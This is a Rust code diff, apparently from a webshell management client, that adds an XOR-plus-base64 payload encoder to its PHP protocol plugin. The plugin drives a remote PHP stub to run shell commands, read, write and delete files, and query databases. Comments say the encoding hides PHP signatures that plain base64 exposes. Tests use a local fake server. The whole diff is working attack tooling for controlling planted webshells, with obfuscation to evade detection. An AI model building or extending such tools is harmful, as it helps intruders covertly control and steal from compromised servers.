@@ -26,10 +26,22 @@ use dosword_sdk::domain::{
 };
 
 use super::transport::build_client;
+use dosword_sdk::encoder::{Base64Encoder, EncoderRegistry, PayloadEncoder};
 use dosword_sdk::{PluginKind, PluginManifest, ProtocolPlugin};
 use dosword_sdk::{Protocol, ProtocolError, SessionState};
 
 pub const PHP_PROTOCOL_ID: &str = "builtin.php.v1";
+
+/// 从 `protocol_params`（JSON）解析编码器 id，缺省 base64（兼容旧配置与旧 stub）。
+fn encoder_for(protocol_params: &str) -> &'static dyn PayloadEncoder {
+    let encoder_id: Option<String> = serde_json::from_str::<serde_json::Value>(protocol_params)
+        .ok()
+        .and_then(|value| value.get("encoder").and_then(|item| item.as_str().map(str::to_string)));
+    match encoder_id.as_deref() {
+        Some(id) => EncoderRegistry::global().get(id).unwrap_or(&Base64Encoder),
+        None => &Base64Encoder,
+    }
+}
 
 impl ProtocolPlugin for PhpProtocol {
     fn manifest(&self) -> PluginManifest {
@@ -53,6 +65,8 @@ pub struct PhpSession {
     pub endpoint: String,
     pub password: String,
     pub client: reqwest::blocking::Client,
+    /// 载荷编码器（连接时由 protocol_params 决定）。
+    pub encoder: &'static dyn PayloadEncoder,
 }
 
 impl SessionState for PhpSession {
@@ -207,15 +221,17 @@ impl PhpProtocol {
         code_template: &str,
         settings: &AppSettings,
         action: &str,
+        encoder: &dyn PayloadEncoder,
     ) -> Result<Value, ProtocolError> {
         // 8 字节随机 nonce（hex 字符串）
         let nonce = random_nonce();
         let start = Instant::now();
         let code = code_template.replace("{NONCE}", &nonce);
 
+        // 按编码器编码载荷（与服务端 stub 的解码逻辑对应）
         let body = url::form_urlencoded::Serializer::new(String::new())
             .append_pair("k", password)
-            .append_pair("x", &B64.encode(&code))
+            .append_pair("x", &encoder.encode(&code, password))
             .finish();
 
         let response = client
@@ -343,7 +359,16 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME
         );
         let client = build_client(settings);
-        let value = self.send_frame(&client, &profile.endpoint, &profile.password, &code, settings, "probe")?;
+        let encoder = encoder_for(&profile.protocol_params);
+        let value = self.send_frame(
+            &client,
+            &profile.endpoint,
+            &profile.password,
+            &code,
+            settings,
+            "probe",
+            encoder,
+        )?;
 
         let server = value
             .pointer("/data/server")
@@ -393,6 +418,7 @@ impl Protocol for PhpProtocol {
             endpoint: profile.endpoint.clone(),
             password: profile.password.clone(),
             client: build_client(settings),
+            encoder: encoder_for(&profile.protocol_params),
         });
         Ok((session, result))
     }
@@ -414,7 +440,7 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME
         );
         let start = Instant::now();
-        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "exec")?;
+        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "exec", php.encoder)?;
         let duration_ms = start.elapsed().as_millis() as u64;
 
         let stdout = value
@@ -448,7 +474,7 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
         );
-        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "list_dir")?;
+        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "list_dir", php.encoder)?;
 
         let entries: Vec<FileEntry> = value
             .pointer("/data/entries")
@@ -491,7 +517,7 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
         );
-        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "read_file")?;
+        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "read_file", php.encoder)?;
 
         value
             .get("data")
@@ -519,7 +545,7 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
         );
-        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "write_file")?;
+        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "write_file", php.encoder)?;
         Ok(())
     }
 
@@ -540,7 +566,7 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
         );
-        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "delete")?;
+        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "delete", php.encoder)?;
         Ok(())
     }
 
@@ -563,7 +589,7 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
         );
-        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "rename")?;
+        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "rename", php.encoder)?;
         Ok(())
     }
 
@@ -584,7 +610,7 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
         );
-        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "mkdir")?;
+        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "mkdir", php.encoder)?;
         Ok(())
     }
 
@@ -609,7 +635,7 @@ impl Protocol for PhpProtocol {
             off = offset,
             len = length,
         );
-        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "read_chunk")?;
+        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "read_chunk", php.encoder)?;
         value
             .get("data")
             .and_then(|v| v.as_str())
@@ -639,7 +665,7 @@ impl Protocol for PhpProtocol {
             TEMPLATE_FRAME,
             off = offset,
         );
-        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "write_chunk")?;
+        self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "write_chunk", php.encoder)?;
         Ok(())
     }
 
@@ -672,7 +698,7 @@ impl Protocol for PhpProtocol {
                 ("DRIVER", &driver),
             ],
         );
-        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "db_probe")?;
+        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "db_probe", php.encoder)?;
         let databases = value
             .pointer("/data/databases")
             .and_then(|v| v.as_array())
@@ -713,7 +739,7 @@ impl Protocol for PhpProtocol {
             ],
         );
         let start = Instant::now();
-        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "db_query")?;
+        let value = self.send_frame(&php.client, &php.endpoint, &php.password, &code, settings, "db_query", php.encoder)?;
         let duration_ms = start.elapsed().as_millis() as u64;
 
         let columns = value
@@ -826,6 +852,7 @@ mod tests {
     use serde_json::json;
 
     use super::*;
+    use dosword_sdk::encoder::md5_hex;
     use dosword_sdk::domain::ShellProfile;
 
     fn settings() -> AppSettings {
@@ -898,7 +925,23 @@ mod tests {
                     .find(|(key, _)| key == "x")
                     .map(|(_, v)| v.clone())
                     .unwrap_or_default();
-                let code = String::from_utf8(B64.decode(&x).unwrap_or_default()).unwrap_or_default();
+                let code = {
+                    // 支持两种编码：裸 base64（含 PHP 特征）或 XOR+base64（key=md5 密码）
+                    let raw = B64.decode(&x).unwrap_or_default();
+                    // 8 字节连续特征串，XOR 乱码命中概率可忽略
+                    let is_plain = raw.windows(8).any(|w| w == b"@ini_set");
+                    if is_plain {
+                        String::from_utf8_lossy(&raw).to_string()
+                    } else {
+                        let key = md5_hex("secret").into_bytes();
+                        let restored: Vec<u8> = raw
+                            .iter()
+                            .enumerate()
+                            .map(|(index, byte)| byte ^ key[index % key.len()])
+                            .collect();
+                        String::from_utf8_lossy(&restored).to_string()
+                    }
+                };
                 let _ = tx.send((k.clone(), code.clone()));
 
                 // 从代码中提取 `echo '{nonce}'` 帧标记
@@ -966,8 +1009,29 @@ mod tests {
     }
 
     #[test]
-    fn exec_round_trip() {
+    fn xor_base64_round_trip() {
+        // 服务端按 XOR+Base64 解码（对应 XOR_BASE64 stub 的解码逻辑）
         let (url, rx) = spawn_fake_server(|_code, _k| {
+            Some(json!({"ok": true, "data": {"stdout": base64::engine::general_purpose::STANDARD.encode("xor-ok")}}))
+        });
+        let mut profile = profile(&url);
+        profile.protocol_params = r#"{"encoder":"xor_base64"}"#.into();
+        let settings = settings();
+        let (session, _) = PhpProtocol.connect(&profile, &settings).unwrap();
+        let output = PhpProtocol
+            .execute_command(session.as_ref(), "id", &settings)
+            .expect("执行应成功");
+        assert_eq!(output.stdout, "xor-ok");
+
+        let _ = rx.recv_timeout(std::time::Duration::from_secs(5)).expect("应收到 probe 请求");
+        let (k, code) = rx.recv_timeout(std::time::Duration::from_secs(5)).expect("应收到 exec 请求");
+        assert_eq!(k, "secret");
+        // fake server 上报的是还原后的明文载荷（XOR 解码成功才可能包含业务代码）
+        assert!(code.contains("shell_exec"), "XOR 载荷应能被服务端还原");
+    }
+
+    #[test]
+    fn exec_round_trip() {        let (url, rx) = spawn_fake_server(|_code, _k| {
             Some(json!({"ok": true, "data": {"stdout": base64::engine::general_purpose::STANDARD.encode("uid=0(root)")}}))
         });
         let profile = profile(&url);
@@ -1025,6 +1089,7 @@ mod tests {
             endpoint: url.clone(),
             password: "secret".into(),
             client: build_client(&settings),
+            encoder: &Base64Encoder,
         };
         let conn = DbConnection {
             driver: "mysql".into(),
@@ -1063,6 +1128,7 @@ mod tests {
             endpoint: url.clone(),
             password: "secret".into(),
             client: build_client(&settings),
+            encoder: &Base64Encoder,
         };
         let conn = DbConnection {
             driver: "sqlite".into(),
@@ -1097,6 +1163,7 @@ mod tests {
             endpoint: url.clone(),
             password: "secret".into(),
             client: build_client(&settings),
+            encoder: &Base64Encoder,
         };
         proto
             .execute_command(&session, "id", &settings)
@@ -1154,6 +1221,7 @@ mod tests {
             endpoint: url,
             password: "secret".into(),
             client: build_client(&settings),
+            encoder: &Base64Encoder,
         };
         let db_path = dir.join("test.sqlite");
         let conn = DbConnection {
